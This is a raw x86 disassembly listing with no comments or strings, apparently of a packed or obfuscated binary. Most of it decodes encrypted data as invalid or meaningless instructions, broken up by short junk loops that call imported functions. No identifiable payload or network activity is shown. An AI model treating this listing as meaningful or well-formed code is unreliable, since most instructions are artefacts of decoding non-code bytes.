  40e122:	jl     0x40e131
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e1a9
  40e12d:	test   DWORD PTR ss:[esi-0x78d7ac71],edx
  40e134:	mov    edi,DWORD PTR [ebx-0xd]
  40e137:	imul   ebp,DWORD PTR [edi-0x3c],0x5a15a26f
  40e13e:	push   esp
  40e13f:	(bad)  
  40e140:	dec    esp
  40e141:	mov    bl,0x23
  40e143:	cmp    eax,0x42982dcc
  40e148:	pop    esi
  40e149:	jecxz  0x40e0e1
  40e14b:	sub    esp,edx
  40e14d:	dec    ebp
  40e14e:	scas   al,BYTE PTR es:[edi]
  40e14f:	sbb    eax,0xa6c18f69
  40e154:	test   BYTE PTR [ebx+0x23],dh
  40e157:	cdq    
  40e158:	mov    bl,0x6d
  40e15a:	(bad)  
  40e15c:	cmp    ch,BYTE PTR [ecx+edx*1-0x596ef27c]
  40e163:	jae    0x40e157
  40e165:	loopne 0x40e0f8
  40e167:	adc    BYTE PTR [ebp-0x1d479f47],dl
  40e16d:	int3   
  40e16e:	loope  0x40e17c
  40e170:	sbb    BYTE PTR [ebp-0x61],al
  40e173:	xor    bl,ah
  40e175:	xor    edx,DWORD PTR [ebx-0x1e3a00d7]
  40e17b:	mov    eax,ds:0x45d6ae2e
  40e180:	aaa    
  40e181:	sbb    BYTE PTR [esi+ecx*2-0x15],cl
  40e185:	shl    DWORD PTR ds:0xdb87b1e7,cl
  40e18b:	(bad)  
  40e18c:	pop    ecx
  40e18d:	ins    DWORD PTR es:[edi],dx
  40e18e:	inc    edi
  40e18f:	or     esi,DWORD PTR [edi-0x58c1aa1f]
  40e195:	jle    0x40e210
  40e197:	mov    esi,0x8e3e1409
  40e19c:	jmp    0x4e02af57
  40e1a1:	jmp    0x40e186
  40e1a3:	push   0x591f1e6f
  40e1a8:	mov    ecx,0x546f18e3
  40e1ad:	mov    dh,BYTE PTR [edi+0x110ae677]
  40e1b3:	rol    ah,1
  40e1b5:	daa    
  40e1b6:	loope  0x40e1dd
  40e1b8:	mov    BYTE PTR [bp+si-0x3e86],dh
  40e1bd:	sar    dl,cl
  40e1bf:	sti    
  40e1c0:	sub    ch,BYTE PTR [edx+eax*4-0x66495792]
  40e1c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1c8:	xchg   ebp,eax
  40e1c9:	pop    ss
  40e1ca:	xor    ebp,DWORD PTR [edx+0xd]
  40e1cd:	cdq    
  40e1ce:	loop   0x40e1e9
  40e1d0:	out    0xbb,al
  40e1d2:	inc    ebp
  40e1d3:	xchg   cx,ax
  40e1d5:	pushf  
  40e1d6:	gs push ebx
  40e1d8:	(bad)  [edi-0x2bcb60cf]
  40e1de:	adc    dh,BYTE PTR [ecx+0x24]
  40e1e1:	and    dl,BYTE PTR [ebx-0x781fe1b2]
  40e1e7:	xor    eax,0x82befb8e
  40e1ec:	fisub  DWORD PTR [edi]
  40e1ee:	paddb  mm0,QWORD PTR [eax]
  40e1f1:	xor    eax,0x8e806dfc
  40e1f6:	bnd je 0x40e1a9
  40e1f9:	cmp    al,BYTE PTR [esi+edx*4+0x73]
  40e1fd:	sbb    al,0xad
  40e1ff:	mov    ch,0xc
  40e201:	bound  ebp,QWORD PTR [ebx+0x5c]
  40e204:	stos   BYTE PTR es:[edi],al
  40e205:	out    0x7c,eax
  40e207:	pop    ebp
  40e208:	xor    eax,0x28388923
  40e20d:	push   ecx
  40e20e:	fs call 0x73017966
  40e214:	adc    DWORD PTR ds:0x130ed024,edx
  40e21a:	fbld   TBYTE PTR [ebp-0xcaa369f]
  40e220:	repnz cwde 
  40e222:	ror    edx,1
  40e224:	loope  0x40e281
  40e226:	gs inc edx
  40e228:	test   BYTE PTR [eax-0x1b8459db],cl
  40e22e:	mov    BYTE PTR [esi-0x40f73afc],ch
  40e234:	lock popf 
  40e236:	icebp  
  40e237:	inc    esp
  40e238:	inc    edx
  40e239:	imul   esp,esi,0x640b712d
  40e23f:	sub    BYTE PTR [eax+0x2b],bh
  40e242:	inc    ebx
  40e243:	std    
  40e244:	fsubr  st(3),st
  40e246:	retf   0xeddc
  40e249:	pop    ebp
  40e24a:	cmp    esp,DWORD PTR [edi+0x75]
  40e24d:	scas   eax,DWORD PTR es:[edi]
  40e24e:	les    esi,FWORD PTR [ebx+0x1203dba4]
  40e254:	mov    eax,ds:0xf1e9b1fc
  40e259:	fidivr WORD PTR [eax+0x2f70a9e8]
  40e25f:	jne    0x40e2c2
  40e261:	mov    ds:0x6c18012a,al
  40e266:	inc    ecx
  40e267:	jecxz  0x40e254
  40e269:	pop    esi
  40e26a:	mov    ?,WORD PTR [edx]
  40e26c:	add    BYTE PTR [esi],0xc7
  40e26f:	aad    0xf
  40e271:	(bad)  
  40e272:	mov    bl,0x78
  40e274:	xor    al,0x70
  40e276:	shr    BYTE PTR [ebx+0x45],1
  40e279:	mov    DWORD PTR [ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fdfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fdfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fdfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fdfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e663
  40e2b0:	cmp    DWORD PTR ds:0x42fdfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fdfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fdfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fdfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fe6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fe6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fe6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fe6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fe6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fe01
  40e315:	call   DWORD PTR ds:0x42e577
  40e31b:	cmp    DWORD PTR ds:0x42fe6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fe6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fe6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e894
  40e340:	mov    ecx,DWORD PTR ds:0x42e89c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fe72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	enter  0xbfd,0x1
  40e37a:	cmp    esp,DWORD PTR [eax+esi*2+0x707fc370]
  40e381:	jo     0x40e3e4
  40e383:	in     eax,0x26
  40e385:	aaa    
  40e386:	jp     0x40e339
  40e388:	int    0xb2
  40e38a:	jmp    FWORD PTR [ecx+0x4e56a9b7]
  40e390:	icebp  
  40e391:	jo     0x40e365
  40e393:	xchg   BYTE PTR [ebp+0x3fe7f15],cl
  40e399:	and    ecx,edi
  40e39b:	(bad)  
  40e39c:	mov    bl,0x6
  40e39e:	mov    al,ds:0xae2d834b
  40e3a3:	jp     0x40e3e0
  40e3a5:	push   ebp
  40e3a6:	xor    BYTE PTR [edi+ecx*4],ah
  40e3a9:	ins    DWORD PTR es:[edi],dx
  40e3aa:	adc    cl,al
  40e3ac:	shl    ch,1
  40e3ae:	jae    0x40e42b
  40e3b0:	push   eax
  40e3b1:	imul   ebp,DWORD PTR [eax-0x42],0xf61728a7
  40e3b8:	sub    ah,bl
  40e3ba:	and    DWORD PTR [edi+0x2736c520],0xfffffffc
  40e3c1:	enter  0x4de5,0x3
  40e3c5:	pop    es
  40e3c6:	aad    0xdb
  40e3c8:	clc    
  40e3c9:	dec    eax
  40e3ca:	jmp    0xa12c:0xf81b9838
  40e3d1:	jne    0x40e3b2
  40e3d3:	or     eax,0x9b77df4
  40e3d8:	div    DWORD PTR [ecx-0x41]
  40e3db:	ja     0x40e39d
  40e3dd:	jp     0x40e425
  40e3df:	adc    eax,0xe8921b2a
  40e3e4:	nop
  40e3e5:	mov    ecx,0x414e4dec
  40e3ea:	jbe    0x40e37e
  40e3ec:	daa    
  40e3ed:	test   al,0x9c
  40e3ef:	neg    BYTE PTR [edi+ebp*4+0x4111cd6b]
  40e3f6:	stos   BYTE PTR es:[edi],al
  40e3f7:	cli    
  40e3f8:	data16 fs mov bl,0xef
  40e3fc:	adc    al,0x9c
  40e3fe:	dec    edi
  40e3ff:	push   ss
  40e400:	pop    ecx
  40e401:	loope  0x40e3f8
  40e403:	neg    bl
  40e405:	ins    BYTE PTR es:[edi],dx
  40e406:	sub    esi,esp
  40e408:	pushf  
  40e409:	test   eax,0x2f41fc5f
  40e40e:	adc    dl,BYTE PTR [esi-0xa]
  40e411:	jb     0x40e3dc
  40e413:	scas   eax,DWORD PTR es:[edi]
  40e414:	fnstcw WORD PTR [ebp-0x56cc3125]
  40e41a:	jb     0x40e443
  40e41c:	jge    0x40e3c9
  40e41e:	mov    ?,WORD PTR [edi+0xe]
  40e421:	leave  
  40e422:	ss mov esp,0x638f781b
  40e428:	pop    edx
  40e429:	fistp  DWORD PTR [ecx+0x4d]
  40e42c:	push   ebx
  40e42d:	out    dx,eax
  40e42e:	xor    ebx,eax
  40e430:	addr16 ret 
  40e432:	mul    cl
  40e434:	ret    0xa107
  40e437:	sahf   
  40e438:	(bad)  
  40e439:	jns    0x40e3eb
  40e43b:	imul   ebp,eax,0xad5d19c4
  40e441:	jp     0x40e41a
  40e443:	push   esi
  40e444:	mov    eax,ds:0xddd6da92
  40e449:	sbb    edx,DWORD PTR [ebp-0x3e]
  40e44c:	(bad)  
  40e44d:	daa    
  40e44e:	cli    
  40e44f:	sub    al,0xc0
  40e451:	cmp    BYTE PTR [esi-0x31],0xcf
  40e455:	or     BYTE PTR [ebp+0x29],bh
  40e458:	test   DWORD PTR [esi],edx
  40e45a:	push   edi
  40e45b:	bound  esp,QWORD PTR [esi+0x50]
  40e45e:	xor    al,0xab
  40e460:	sub    DWORD PTR [edx+ecx*2+0xa],ecx
  40e464:	or     al,0x2
  40e466:	mov    ds:0x929cfac0,al
  40e46b:	rcl    edi,0xfc
  40e46e:	lea    esi,[edi]
  40e470:	cmp    dh,BYTE PTR [edx+0xb55e30f]
  40e476:	pop    esp
  40e477:	cmp    eax,0x5f0d99ad
  40e47c:	mov    dl,0x60
  40e47e:	repz ret 0x28e8
  40e482:	and    DWORD PTR [edi+0x336e1f27],edx
  40e488:	add    esp,eax
  40e48a:	jg     0x40e479
  40e48c:	cdq    
  40e48d:	xor    bl,BYTE PTR [eax+0x37]
  40e490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e491:	mov    ecx,0xeeb8c36e
  40e496:	shl    ebp,1
  40e498:	std    
  40e499:	clc    
  40e49a:	data16 aaa 
  40e49c:	scas   al,BYTE PTR es:[edi]
  40e49d:	dec    ecx
  40e49e:	xor    eax,0xa34af7bf
  40e4a3:	pop    edx
  40e4a4:	(bad)  
  40e4a5:	out    dx,eax
  40e4a6:	jl     0x40e47d
  40e4a8:	rcr    BYTE PTR [ecx],cl
  40e4aa:	sbb    eax,DWORD PTR [ebx]
  40e4ac:	or     DWORD PTR [edx-0x2f],eax
  40e4af:	cld    
  40e4b0:	dec    esi
  40e4b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4b2:	loop   0x40e441
  40e4b4:	pop    ecx
  40e4b5:	out    0x4f,eax
  40e4b7:	lahf   
  40e4b8:	int    0xdd
  40e4ba:	lods   eax,DWORD PTR ds:[esi]
  40e4bb:	shl    BYTE PTR ds:0x16a3d043,1
  40e4c1:	stos   DWORD PTR es:[edi],eax
  40e4c2:	xlat   BYTE PTR ds:[ebx]
  40e4c3:	xchg   DWORD PTR ds:0x286ab0f0,edi
  40e4c9:	(bad)  
  40e4cb:	fistp  WORD PTR [edx+0x45c7bb26]
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0xd641740f
  40e4f5:	lods   al,BYTE PTR ds:[esi]
  40e4f6:	les    ecx,FWORD PTR [esi-0x3c8f8f5d]
  40e4fc:	jg     0x40e56e
  40e4fe:	jo     0x40e4cf
  40e500:	fdiv   st,st(4)
  40e502:	sub    eax,0x36972db1
  40e507:	inc    esi
  40e508:	mov    edx,0xa907776a
  40e50d:	outs   dx,DWORD PTR ds:[esi]
  40e50e:	or     DWORD PTR [ebx-0x65],eax
  40e511:	call   0xfddd:0xecbd9cda
  40e518:	dec    esi
  40e519:	mov    es,WORD PTR [ebx]
  40e51b:	jb     0x40e4df
  40e51d:	daa    
  40e51e:	cli    
  40e51f:	xor    DWORD PTR [ecx*4+0x35dc2371],0xffffffc8
  40e527:	and    cl,BYTE PTR [eax-0x7caffca6]
  40e52d:	push   0xffffffc3
  40e52f:	sahf   
  40e530:	or     dh,BYTE PTR [esi-0xa22033e]
  40e536:	test   al,0xe0
  40e538:	mov    dh,0x0
  40e53a:	adc    bl,BYTE PTR [esi-0x41d1c52d]
  40e540:	bswap  esi
  40e542:	lods   al,BYTE PTR ds:[esi]
  40e543:	lahf   
  40e544:	imul   esi,DWORD PTR [edi-0x4fa76891],0x3a
  40e54b:	sub    BYTE PTR [ecx-0x333b4b21],ah
  40e551:	jae    0x40e4f5
  40e553:	xchg   edi,eax
  40e554:	cli    
  40e555:	test   al,0xda
  40e557:	xor    BYTE PTR [ebx-0x2a],dl
  40e55a:	push   ebx
  40e55b:	inc    edx
  40e55c:	adc    BYTE PTR [eax],al
  40e55e:	pop    es
  40e55f:	inc    esp
  40e560:	and    BYTE PTR [edx+0x1a],cl
  40e563:	out    dx,al
  40e564:	push   esi
  40e565:	aad    0xc
  40e567:	out    dx,eax
  40e568:	sub    ecx,DWORD PTR ds:0xd7da9141
  40e56e:	shl    DWORD PTR [esi],cl
  40e570:	fisubr WORD PTR [ebx+0x31142136]
  40e576:	xor    eax,0xbeedc75b
  40e57b:	adc    BYTE PTR [edi-0x69],0x90
  40e57f:	shl    DWORD PTR [ecx-0x3a],1
  40e582:	hlt    
  40e583:	sbb    DWORD PTR [edx+esi*8-0x22],ecx
  40e587:	dec    ebx
  40e588:	ret    0x35ca
  40e58b:	rcl    BYTE PTR [ebp+0x24],0xe1
  40e58f:	sub    eax,0x6e675ff0
  40e594:	xor    dh,BYTE PTR [esp+edx*2]
  40e597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e598:	dec    edx
  40e599:	retf   0xa2f0
  40e59c:	jae    0x40e554
  40e59e:	push   esi
  40e59f:	push   eax
  40e5a0:	scas   eax,DWORD PTR es:[edi]
  40e5a1:	ja     0x40e607
  40e5a3:	mov    ds:0x2de7511c,eax
  40e5a8:	xchg   ebx,eax
  40e5a9:	adc    DWORD PTR [ebx],edi
  40e5ab:	jp     0x40e603
  40e5ad:	and    al,0x22
  40e5af:	add    esp,ecx
  40e5b1:	stc    
  40e5b2:	into   
  40e5b3:	aad    0x18
  40e5b5:	jb     0x40e58e
  40e5b7:	daa    
  40e5b8:	lahf   
  40e5b9:	test   BYTE PTR [esi+ebp*1],ch
  40e5bc:	(bad)  
  40e5be:	sub    BYTE PTR [esi-0x2a],cl
  40e5c1:	or     DWORD PTR [ecx-0x2],0xffffffe5
  40e5c5:	pop    ds
  40e5c6:	cmp    DWORD PTR [ebx-0x4772f6ad],ebp
  40e5cc:	pop    edi
  40e5cd:	data16 shr al,1
  40e5d0:	aaa    
  40e5d1:	cdq    
  40e5d2:	sbb    BYTE PTR es:[ecx-0x12],dh
  40e5d6:	adc    eax,0xce2b8377
  40e5db:	and    eax,DWORD PTR [ecx+ebx*2-0x4]
  40e5df:	loopne 0x40e5bd
  40e5e1:	pop    esi
  40e5e2:	aad    0x52
  40e5e4:	inc    esp
  40e5e5:	je     0x40e65c
  40e5e7:	xor    ah,BYTE PTR ds:0xd6f02554
  40e5ed:	lahf   
  40e5ee:	std    
  40e5ef:	xchg   edx,eax
  40e5f0:	lods   eax,DWORD PTR ds:[esi]
  40e5f1:	sahf   
  40e5f2:	(bad)  
  40e5f4:	xchg   BYTE PTR [esi],bl
  40e5f6:	lods   eax,DWORD PTR ds:[esi]
  40e5f7:	aam    0x82
  40e5f9:	jle    0x40e5e9
  40e5fb:	jge    0x40e5ad
  40e5fd:	xchg   edi,eax
  40e5fe:	rol    ebp,0x14
  40e601:	lods   al,BYTE PTR ds:[esi]
  40e602:	aam    0x90
  40e604:	aas    
  40e605:	dec    ecx
  40e606:	cmp    esi,esp
  40e608:	sbb    al,0xa8
  40e60a:	pop    es
  40e60b:	cmp    edi,DWORD PTR [esi-0x5b36acdb]
  40e611:	int3   
  40e612:	lods   al,BYTE PTR ds:[esi]
  40e613:	jo     0x40e691
  40e615:	xchg   DWORD PTR [edi+0x71126379],edi
  40e61b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e61c:	shl    ah,cl
  40e61e:	xchg   edx,eax
  40e61f:	pop    eax
  40e620:	cli    
  40e621:	ret    0x773f
  40e624:	adc    edx,DWORD PTR [ebx]
  40e626:	std    
  40e627:	xchg   esi,eax
  40e628:	jo     0x40e672
  40e62a:	fcos   
  40e62c:	dec    eax
  40e62d:	push   ds
  40e62e:	jmp    0x40e634
  40e630:	or     al,BYTE PTR [edi+0x617f3a3f]
  40e636:	mov    ?,WORD PTR [ecx+ecx*4]
  40e639:	cmp    DWORD PTR [edi-0x3e16a08],0x8
  40e640:	adc    BYTE PTR [eax+esi*2+0x2b],ch
  40e644:	xor    esp,DWORD PTR [ecx-0x39]
  40e647:	daa    
  40e648:	out    0x16,eax
  40e64a:	lods   al,BYTE PTR ds:[esi]
  40e64b:	sahf   
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fe7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fe7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fe7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fe7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fe7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e57b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e21c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fe01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fdd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	and    eax,0x51614a4f
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	xchg   edi,eax
  40e6e7:	dec    eax
  40e6e8:	ds jbe 0x40e696
  40e6eb:	retf   
  40e6ec:	jge    0x40e6a6
  40e6ee:	outs   dx,DWORD PTR ds:[esi]
  40e6ef:	sub    DWORD PTR [ecx],edi
  40e6f1:	outs   dx,DWORD PTR ds:[esi]
  40e6f2:	pop    esi
  40e6f3:	fadd   QWORD PTR [edi+0x47]
  40e6f6:	lds    esp,FWORD PTR [edi+0x55]
  40e6f9:	and    eax,0x57fa1c5d
  40e6fe:	add    DWORD PTR [ebx-0x388b85e9],ebp
  40e704:	xor    ebx,esp
  40e706:	in     eax,0xe6
  40e708:	pop    esp
  40e709:	adc    bh,BYTE PTR [edx+0x4b4f1bac]
  40e70f:	imul   BYTE PTR [esi]
  40e711:	in     eax,dx
  40e712:	ds push es
  40e714:	mov    esp,0xa4b7698e
  40e719:	fstp   DWORD PTR ds:0xdd2b08b7
  40e71f:	xlat   BYTE PTR ds:[ebx]
  40e720:	sub    bh,BYTE PTR [edi+0xe]
  40e723:	popf   
  40e724:	or     DWORD PTR [ebp-0x4d1beb30],ecx
  40e72a:	lods   eax,DWORD PTR ds:[esi]
  40e72b:	inc    esp
  40e72c:	sub    DWORD PTR [edx],esp
  40e72e:	hlt    
  40e72f:	call   0xcbb9:0xf2e05d76
  40e736:	mov    al,BYTE PTR [esi-0x5281c02e]
  40e73c:	xchg   BYTE PTR [edi+0x1917ae91],cl
  40e742:	add    al,0x30
  40e744:	sbb    ah,0xfa
  40e747:	pop    edx
  40e748:	mov    ds:0xf75b3d58,eax
  40e74d:	nop
  40e74e:	pop    edi
  40e74f:	jbe    0x40e7c2
  40e751:	aaa    
  40e752:	dec    ecx
  40e753:	jns    0x40e755
  40e755:	loope  0x40e76b
  40e757:	push   ebp
  40e758:	jns    0x40e77e
  40e75a:	mov    BYTE PTR [ecx-0x356ec0f7],0x62
  40e761:	clc    
  40e762:	popa   
  40e763:	sbb    eax,0x23c67ab1
  40e768:	std    
  40e769:	outs   dx,BYTE PTR ds:[esi]
  40e76a:	adc    ah,BYTE PTR [ebx-0x6421fa88]
  40e770:	bound  ebp,QWORD PTR [edi+0x423d5095]
  40e776:	add    BYTE PTR [eax+0x7490051],dl
  40e77c:	dec    esi
  40e77d:	and    BYTE PTR [ecx-0x53f900b6],ch
  40e783:	adc    DWORD PTR [edi-0x17],edi
  40e786:	mov    ebx,esp
  40e788:	mov    dl,0xa0
  40e78a:	mov    bl,0x47
  40e78c:	loope  0x40e7ee
  40e78e:	pop    esp
  40e78f:	dec    ebx
  40e790:	xchg   esi,eax
  40e791:	ja     0x40e7bb
  40e793:	add    BYTE PTR [ecx+0x11],dh
  40e796:	xchg   edx,eax
  40e797:	icebp  
  40e798:	je     0x40e78e
  40e79a:	daa    
  40e79b:	push   esp
  40e79c:	add    al,0x5b
  40e79e:	push   es
  40e79f:	push   esp
  40e7a0:	cld    
  40e7a1:	std    
  40e7a2:	rcl    BYTE PTR [esp+ebx*4],cl
  40e7a5:	push   DWORD PTR [edi]
  40e7a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7a8:	jge    0x40e7c2
  40e7aa:	dec    eax
  40e7ab:	bound  ecx,QWORD PTR [esi+eax*8-0x24c033a0]
  40e7b2:	es fs in al,0x15
  40e7b6:	dec    esp
  40e7b7:	push   0x74262fd0
  40e7bc:	mov    ecx,0xb426dad1
  40e7c1:	test   al,0x10
  40e7c3:	add    BYTE PTR [esi+0x55],cl
  40e7c6:	ja     0x40e817
  40e7c8:	outs   dx,DWORD PTR ds:[esi]
  40e7c9:	nop
  40e7ca:	xchg   ecx,eax
  40e7cb:	data16 jge 0x40e7c2
  40e7ce:	mov    edi,0xb37b940
  40e7d3:	push   ds
  40e7d4:	cmc    
  40e7d5:	stos   BYTE PTR es:[edi],al
  40e7d6:	test   eax,0xa23bb750
  40e7db:	dec    ebp
  40e7dc:	pop    edx
  40e7dd:	fwait
  40e7de:	in     al,0xa1
  40e7e0:	mov    esi,0x3a563409
  40e7e5:	sub    BYTE PTR [edx],0xb0
  40e7e8:	xor    dl,BYTE PTR [ebx+0x33]
  40e7eb:	jno    0x40e794
  40e7ed:	xchg   ecx,eax
  40e7ee:	jo     0x40e77b
  40e7f0:	test   bl,dh
  40e7f2:	aas    
  40e7f3:	outs   dx,BYTE PTR ds:[esi]
  40e7f4:	xchg   edx,eax
  40e7f5:	mov    eax,ds:0x9591f399
  40e7fa:	and    dl,0x1
  40e7fd:	add    BYTE PTR ds:0x519256a3,bl
  40e803:	inc    edi
  40e804:	cs (bad) 
  40e806:	repz mov bh,0x99
  40e809:	les    edx,FWORD PTR [ecx+0x689f2b76]
  40e80f:	je     0x40e7ef
  40e811:	out    dx,eax
  40e812:	push   es
  40e813:	lock mov ss,WORD PTR [esi+0x3a]
  40e817:	pusha  
  40e818:	push   edi
  40e819:	pop    ss
  40e81a:	adc    DWORD PTR [ebp-0x2c],esi
  40e81d:	pop    ebx
  40e81e:	jae    0x40e7e7
  40e820:	sub    eax,DWORD PTR [eax]
  40e822:	stc    
  40e823:	dec    eax
  40e824:	cmp    bl,BYTE PTR [ecx+eax*4]
  40e827:	aas    
  40e828:	inc    esp
  40e829:	jae    0x40e840
  40e82b:	rol    BYTE PTR [edi+0x7e],0xb
  40e82f:	iret   
  40e830:	sub    DWORD PTR [ebx-0x7eff7414],ebp
  40e836:	adc    eax,0x42fde9
  40e83b:	addr16 push eax
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fe0d,0x42fe7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fde1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e21c,0x42e7ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e80b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fdd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fdd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fdd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fdd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fdd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e2e7
  40e8ca:	call   DWORD PTR ds:0x42e57f
  40e8d0:	cmp    DWORD PTR ds:0x42fdd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fdd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fdd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fe8a
  40e8f8:	adc    DWORD PTR ds:0x42e7ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e7f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e7fb,0x42e7ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fe01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fe0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e80b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	aas    
  40e94a:	jp     0x40e961
  40e94c:	and    eax,0x7070a024
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e8fe
  40e956:	mov    cl,0xac
  40e958:	div    DWORD PTR [edx]
  40e95a:	arpl   WORD PTR [eax-0x2d],ax
  40e95d:	mov    bh,0x43
  40e95f:	jp     0x40e930
  40e961:	pop    ecx
  40e962:	jne    0x40e9c9
  40e964:	pop    ebx
  40e965:	jmp    0x40e9c7
  40e967:	aam    0x46
  40e969:	mov    ds:0xa8216026,eax
  40e96e:	cdq    
  40e96f:	repz push ebp
  40e971:	dec    esp
  40e972:	test   eax,0x38ad092f
  40e977:	out    dx,eax
  40e978:	pop    es
  40e979:	pop    ds
  40e97a:	add    ebp,edi
  40e97c:	lahf   
